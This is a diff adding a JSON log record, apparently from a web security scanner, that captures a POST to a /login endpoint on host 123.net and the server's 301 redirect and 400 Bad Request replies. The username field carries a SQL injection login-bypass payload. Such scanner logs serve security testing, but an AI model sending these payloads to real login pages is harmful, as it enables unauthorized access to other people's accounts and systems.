@@ -1,0 +1,15 @@
+{
+  "request": {
+    "url": "engine_simulation",
+    "full_http_request": "POST /login HTTP/1.1\nHost: 123.net\nContent-Type: application/json\nConnection: keep-alive\n\n{\"username\": \"admin' OR '1'='\", \"password\": \"admin123\"}"
+  },
+  "response": {
+    "statusCode": 200,
+    "httpResponseContent": "HTTP/1.1 301 Moved Permanently\r\nServer: nginx/1.25.4\r\nDate: Tue, 06 Jan 2026 12:18:57 GMT\r\nContent-Type: text/html\r\nContent-Length: 169\r\nConnection: keep-alive\r\nLocation: https://www.123.net/login\r\nStrict-Transport-Security: max-age=31536000\r\n\r\n<html>\r\n<head><title>301 Moved Permanently</title></head>\r\n<body>\r\n<center><h1>301 Moved Permanently</h1></center>\r\n<hr><center>nginx/1.25.4</center>\r\n</body>\r\n</html>\r\nHTTP/1.1 400 Bad Request\r\nServer: nginx/1.25.4\r\nDate: Tue, 06 Jan 2026 12:18:57 GMT\r\nContent-Type: text/html\r\nContent-Length: 157\r\nConnection: close\r\nStrict-Transport-Security: max-age=31536000\r\n\r\n<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad Request</h1></center>\r\n<hr><center>nginx/1.25.4</center>\r\n</body>\r\n</html>\r\n"
+  },
+  "meta": {
+    "isPipeline": false
+  },
+  "recordId": "0585b6fd01524eedb147ae2a5ad1204b",
+  "timestamp": "2026-01-06 20:19:00"
+}
